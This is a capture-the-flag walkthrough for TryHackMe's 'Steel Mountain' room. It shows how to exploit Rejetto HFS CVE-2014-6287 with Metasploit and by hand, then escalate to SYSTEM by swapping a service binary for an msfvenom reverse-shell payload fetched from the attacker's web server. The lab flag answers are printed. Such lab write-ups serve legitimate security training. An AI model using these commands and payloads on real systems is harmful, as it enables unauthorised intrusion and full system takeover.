# Steel Mountain — TryHackMe Walkthrough

Hey folks! Been going through this room and noticed most walkthroughs skip over important details. Figured I'd write something that actually covers everything properly. This one's special because of all the Mr. Robot references scattered throughout. You'll get hands-on with Metasploit, Windows privilege escalation tricks, and reverse shell techniques. Let's break it down.

**Room Link:** https://tryhackme.com/room/steelmountain

---

## Task 1: Getting Started

### Finding the Employee of the Month

Fire up your browser and point it to the target machine's IP. You'll land on the employee of the month page. Right-click the image and hit "Inspect" or just press F12. Look at the image filename — it's literally the employee's name. Sometimes the easiest stuff is right in front of you.

**Answer:** Bill Harper

---

## Task 2: Getting That Initial Foothold

### Scanning for Open Ports

Let's start with a basic nmap scan to see what services are running:

```bash
nmap -sC <target_ip>
```

Check the output under the "SERVICE" column. You'll spot something interesting on port 8080.

**Answer:** 8080

### Identifying the File Server

Head over to http://<target_ip>:8080 in your browser. You'll see the HFS (HTTP File Server) interface. Scroll down to "Server Information" — there's a clickable link that reveals the server name and version.

**Answer:** Rejetto HTTP File Server

### Finding the Right CVE

Hit up Exploit-DB and search for "Rejetto HTTP File Server 2.3". You'll find it's vulnerable to remote command execution. Perfect.

**Answer:** 2014-6287

### Getting a Shell with Metasploit

Time to fire up Metasploit:

```bash
msfconsole
```

Find the exploit:

```bash
search rejetto
```

Load the module:

```bash
use exploit/windows/http/rejetto_hfs_exec
```

Set the required options:

```bash
set RHOSTS <target_ip>
set RPORT 8080
set LHOST <your_ip>
set LPORT 4545
```

Run it:

```bash
run
```

Quick Note: Sometimes it fails on the first try. Just run it again, usually works on the second attempt.

Once you get the Meterpreter session, drop into a standard Windows shell:

```bash
shell
```

Navigate to Bill's desktop and grab the flag:

```bash
cd C:\Users\Bill\Desktop
dir
type flag.txt
```

**Answer:** b04763b6fcf51fcd7c13abc7db4fd365

---

## Task 3: Privilege Escalation

### Getting PowerUp Ready

Now that we're in, we need to escalate privileges. We'll use PowerUp — a PowerShell script that finds common Windows privilege escalation vectors. It's basically a one-stop shop for finding misconfigurations.

Download it from here: PowerUp.ps1

Upload it to the target via Meterpreter:

```bash
upload PowerUp.ps1
```

Load PowerShell within Meterpreter:

```bash
load powershell
powershell_shell
```

Run the script:

```bash
. .\PowerUp.ps1
Invoke-AllChecks
```

Look carefully at the output. You'll see a service with CanRestart set to true — that's our ticket to SYSTEM.

### Finding the Vulnerable Service

**Answer:** AdvancedSystemCareService9

Exit PowerShell (exit twice) to get back to Meterpreter.

### Creating Our Malicious Payload

Open a new terminal tab. Generate a reverse shell executable:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<your_ip> LPORT=4646 -e x86/shikata_ga_nai -f exe-service -o ASCService.exe
```

### Replacing the Legitimate Service

Back in your Meterpreter shell, stop the service:

```bash
shell
sc stop AdvancedSystemCareService9
```

Hit Ctrl+C to exit the process and return to Meterpreter. Upload our malicious binary:

```bash
upload ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
```

### Starting the Listener

Open another terminal tab for the listener:

```bash
nc -lvnp 4646
```

### Restarting the Service

Back in the shell, restart the service:

```bash
shell
sc start AdvancedSystemCareService9
```

Check your netcat listener — you should now have a SYSTEM shell!

### Getting the Root Flag

Navigate to the Administrator's desktop:

```bash
cd C:\Users\Administrator\Desktop
dir
type root.txt
```

**Answer:** 9af5f314f57607c00fd09803a587db80

---

## Task 4: Doing It All Without Metasploit

### Setup

Close everything you currently have open. We'll do this the manual way. Download these tools:
- winPEAS binary
- netcat static binary

### Starting the Listener

```bash
nc -lvnp 4747
```

### Starting a Python Web Server

Open another terminal tab:

```bash
python3 -m http.server 80
```

### Modifying the Exploit

Open a third terminal tab for the exploit we downloaded earlier (39161.py):

```bash
nano 39161.py
```

Update the script with your IP and port details.

### Executing the Exploit

Run it twice — sometimes the first attempt doesn't work:

```bash
python2 39161.py <target_ip> 8080
python2 39161.py <target_ip> 8080
```

Check your netcat listener — you should have a reverse shell!

### Transferring winPEAS

From the reverse shell, download winPEAS:

```powershell
powershell -c wget "http://<your_ip>:80/winPEASx64.exe" -outfile "winPEASx64.exe"
```

### Running winPEAS

```cmd
winPEASx64.exe
```

### Finding the Service Name Manually

```powershell
powershell -c "Get-Service"
```

### Privilege Escalation (Manual)

Pull the malicious binary we created earlier:

```powershell
powershell -c wget "http://<your_ip>:80/ASCService.exe" -outfile "ASCService.exe"
```

Stop the legitimate service:

```cmd
sc stop AdvancedSystemCareService9
```

Replace it with our binary:

```cmd
copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
```

### Starting Another Listener

Open a new terminal tab:

```bash
nc -lvnp 4646
```

### Restarting the Service

```cmd
sc start AdvancedSystemCareService9
```

Check your listener — SYSTEM shell achieved!

---

## Wrapping Up

And there you go! You've successfully exploited Steel Mountain both ways — with and without Metasploit. This room covers some fundamental skills that'll serve you well:

- **Reconnaissance** — finding open ports and identifying services
- **Exploitation** — leveraging known vulnerabilities for initial access
- **Privilege Escalation** — using PowerUp and manual techniques
- **Post-Exploitation** — navigating the file system and finding flags

Always remember to get proper authorization before testing these techniques on systems you don't own. Stay curious, keep learning, and most importantly — have fun with it!
